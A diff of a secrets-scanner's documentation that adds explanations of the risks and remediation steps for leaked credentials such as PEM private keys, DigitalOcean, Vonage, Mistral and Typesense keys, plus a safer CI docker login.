 **Risk:** An exposed PEM private key lets an attacker impersonate your service in TLS handshakes, forge signed JWTs or documents, decrypt intercepted encrypted traffic, or assume any identity associated with the key, depending on how the key is used.
+
+**Why it matters:** The header line names the format: BEGIN RSA PRIVATE KEY is PKCS#1, BEGIN PRIVATE KEY is PKCS#8, and BEGIN OPENSSH PRIVATE KEY is an SSH key, which may be passphrase protected. Reading that line and running openssl pkey -noout -text on a saved copy tells you the type and size before you start replacing anything. See also private-key-exposed for the steps that depend on what the key was used for.
 
 **References:**
 - https://owasp.org/www-project-secrets-management/
@@ -19655,6 +19794,8 @@ ibmcloud iam service-api-key-create my-key my-service
 dop_v1_* tokens allow full control over droplets, databases, spaces, and Kubernetes clusters.
 
 **Risk:** An exposed DigitalOcean PAT gives an attacker full API access to your entire DigitalOcean account, including creating and deleting Droplets, accessing managed databases, reading Spaces object storage, and controlling Kubernetes clusters.
+
+**Why it matters:** A dop_v1_ token acts on the whole team unless it was created with custom scopes, and the API that creates a Droplet can also snapshot or destroy one. An attacker can snapshot a database server, copy the image out, and add their own SSH key to new Droplets. Review the account's activity history for API actions during the time the token was exposed.
 
 **References:**
 - https://docs.digitalocean.com/reference/api/digitalocean/
@@ -19848,6 +19989,8 @@ Honeycomb events API keys grant ingest to specific datasets; long-lived classic 
 
 **Risk:** An exposed Honeycomb write key lets an attacker inject fake trace events to poison observability data, potentially hiding real errors or performance issues from your engineering team during an incident.
 
+**Why it matters:** Ingest keys cannot normally read data, which limits the damage: the realistic harm is noise. Fake events inflate your event quota and muddy the traces you rely on during an incident. Configuration keys can be wider than that, so check this key's permissions in Team Settings before deciding how urgent rotation is. Browser telemetry should go through a collector or proxy so the key stays on the server.
+
 **References:**
 - https://docs.honeycomb.io/api/authentication/
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19922,9 +20065,7 @@ GitLab deploy tokens grant push/pull to the project registry and package registr
 docker_pull:
   script:
     # Use the automatically-provided CI_JOB_TOKEN (expires after the job)
-    - docker login -u $CI_REGISTRY_USER \
-        -p $CI_JOB_TOKEN \
-        $CI_REGISTRY
+    - echo "$CI_JOB_TOKEN" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
     - docker pull $CI_REGISTRY_IMAGE:latest
     # Never use a hard-coded deploy token here
 ```
@@ -20132,6 +20273,8 @@ MessageBird access keys grant SMS, voice, WhatsApp, and contact-list access on t
 
 **Risk:** An exposed MessageBird access key allows an attacker to send bulk SMS and WhatsApp messages billed to your account, access all contact lists and message history, and potentially intercept OTP codes sent to your users.
 
+**Why it matters:** An SMS API key is directly spendable. The common abuse is toll fraud, where messages are pumped to premium-rate numbers the attacker profits from, and the bill can run up in hours. The other risk is trust: messages go out under your registered sender name, so a phishing text looks as if it came from you. Set balance alerts and per-country restrictions so that a future leak has a limit.
+
 **References:**
 - https://developers.messagebird.com/api/access-keys/
 - https://cwe.mitre.org/data/definitions/798.html
@@ -20162,6 +20305,8 @@ function sendSms(to: string, body: string) {
 Vonage (formerly Nexmo) API key/secret pairs grant SMS, voice, verify, and conversation API access.
 
 **Risk:** An exposed Vonage API key/secret pair grants full access to SMS, voice, and 2FA verification APIs, allowing an attacker to send unlimited messages at your expense, intercept OTP verification codes sent to your users, and access all conversation history.
+
+**Why it matters:** The key is a short public identifier and the secret is the credential, so a finding with both is a working login for the account. Toll fraud through premium-rate SMS destinations is the usual way these are monetized, and the Verify API lets an attacker send codes under your brand. The legacy key and secret pair applies to the whole account, which is why application-scoped JWT authentication is worth the move.
 
 **References:**
 - https://developer.vonage.com/en/getting-started/credentials
@@ -20221,6 +20366,8 @@ Cohere trial/production keys grant access to generate, embed, and classify endpo
 
 **Risk:** An exposed Cohere API key allows an attacker to consume your generation and embedding quotas, incurring billable usage charges. Production keys also expose any fine-tuned models or datasets you have created.
 
+**Why it matters:** Model API keys are resold and used to run free inference at your expense, so leaked ones get picked up quickly by automated scrapers. Usage records show the abuse by time and endpoint, which helps date the leak. In a browser app there is no safe place to hold the key, so the call has to go through your backend.
+
 **References:**
 - https://docs.cohere.com/reference/authentication
 - https://cwe.mitre.org/data/definitions/798.html
@@ -20255,6 +20402,8 @@ export async function POST(req: Request) {
 Mistral API keys grant chat/completion/embedding access on the La Plateforme and can incur significant cost.
 
 **Risk:** An exposed Mistral API key allows an attacker to consume your chat and embedding quotas without restriction, potentially incurring large charges and exhausting your rate limits, disrupting your own application's ability to serve users.
+
+**Why it matters:** A key in a browser bundle is the same as a public endpoint billed to you. Anyone can lift it from the network tab and point their own tools at it, and your app starts failing with 429 errors when they use up the rate limit. A monthly spending limit in the console gives a leak a ceiling, and per-user limits on your proxy route stop your own users from doing the same thing.
 
 **References:**
 - https://docs.mistral.ai/api/
@@ -20351,6 +20500,8 @@ curl -X POST 'http://localhost:7700/keys' \
 Typesense admin keys grant full schema, document, and key-management control on the cluster.
 
 **Risk:** An exposed Typesense admin key lets an attacker delete all collections, overwrite document data, generate new API keys for persistent access, and modify cluster configuration, a complete takeover of your search infrastructure.
+
+**Why it matters:** Typesense has two classes of key, and confusing them is how this happens. The bootstrap admin key set with --api-key can do everything, including minting new keys, so an attacker can make a key of their own that survives rotation of the one they found. A scoped search key is safe in front-end code by design. After replacing the admin key, list keys with GET /keys and delete any you did not create.
 
 **References:**
 - https://typesense.org/docs/latest/api/keys.html
@@ -20607,6 +20758,8 @@ posthog.init(process.env.NEXT_PUBLIC_POSTHOG_KEY!, { // phc_*, public by design
 Perplexity API keys (pplx-*) grant billable access to Perplexity's chat completion / search endpoints.
 
 **Risk:** An exposed Perplexity API key lets an attacker consume your chat completion and search quotas without restriction, incurring billable usage charges and potentially exhausting rate limits your own application depends on.
+
+**Why it matters:** A pplx- key in client code has no protection a user cannot remove. Browser devtools show it in the Authorization header of every request, and then it works from any machine. Usage is billed to your account, so the first symptom may be your own app failing once the balance or rate limit runs out. A server route that holds the key also lets you add per-user limits.
 
 **References:**
 - https://docs.perplexity.ai/guides/getting-started
